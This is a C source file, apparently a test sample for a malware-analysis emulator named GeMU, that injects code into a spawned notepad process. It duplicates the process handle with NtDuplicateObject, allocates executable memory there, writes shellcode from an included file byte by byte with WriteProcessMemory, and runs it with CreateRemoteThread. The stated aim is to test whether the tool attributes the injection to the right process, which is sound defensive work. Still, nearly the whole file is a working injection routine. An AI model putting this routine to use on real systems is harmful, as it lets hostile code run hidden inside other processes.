/*
 * Injection via NtDuplicateObject + WriteProcessMemory.
 *
 * Exercises NtDuplicateObject handle-duplication tracking:
 *   1. OpenProcess -> hProcess
 *   2. NtDuplicateObject(hProcess) -> hDup  (target process handle via duplication)
 *   3. VirtualAllocEx / WriteProcessMemory / CreateRemoteThread using hDup
 *
 * GeMU must follow the duplicated handle so the WriteProcessMemory in
 * step 3 is still attributed to the correct target PID.
 *
 * compile: i686-w64-mingw32-gcc or x86_64-w64-mingw32-gcc
 */
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "encrypted_shellcode.c"

typedef NTSTATUS (NTAPI *PNT_DUPLICATE_OBJECT)(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Options
);

int main(void) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, "C:\\Windows\\system32\\notepad.exe",
                        NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                        NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("Spawned notepad PID=%lu\n", pi.dwProcessId);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (!hProcess) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PNT_DUPLICATE_OBJECT NtDuplicateObject =
        (PNT_DUPLICATE_OBJECT)GetProcAddress(hNtdll, "NtDuplicateObject");
    if (!NtDuplicateObject) {
        printf("NtDuplicateObject not found\n");
        return 1;
    }

    HANDLE hDup = NULL;
    NTSTATUS status = NtDuplicateObject(
        GetCurrentProcess(), hProcess,
        GetCurrentProcess(), &hDup,
        PROCESS_ALL_ACCESS, 0, 0
    );
    if (status != 0) {
        printf("NtDuplicateObject failed: 0x%lx\n", status);
        return 1;
    }
    printf("Duplicated handle: original=%p dup=%p\n", hProcess, hDup);

    /* Inject shellcode via the duplicated handle */
    LPVOID remote_buf = VirtualAllocEx(hDup, NULL, sizeof(encrypted_shellcode),
                                        MEM_RESERVE | MEM_COMMIT,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        printf("VirtualAllocEx failed: %lu\n", GetLastError());
        return 1;
    }

    for (int i = 0; i < (int)sizeof(encrypted_shellcode); i++) {
        unsigned char b = get_shellcode_byte(i);
        SIZE_T written = 0;
        WriteProcessMemory(hDup, (char *)remote_buf + i, &b, 1, &written);
    }

    HANDLE hThread = CreateRemoteThread(hDup, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote_buf,
                                         NULL, 0, NULL);
    if (!hThread)
        printf("CreateRemoteThread failed: %lu\n", GetLastError());

    CloseHandle(hDup);
    CloseHandle(hProcess);
    return 0;
}
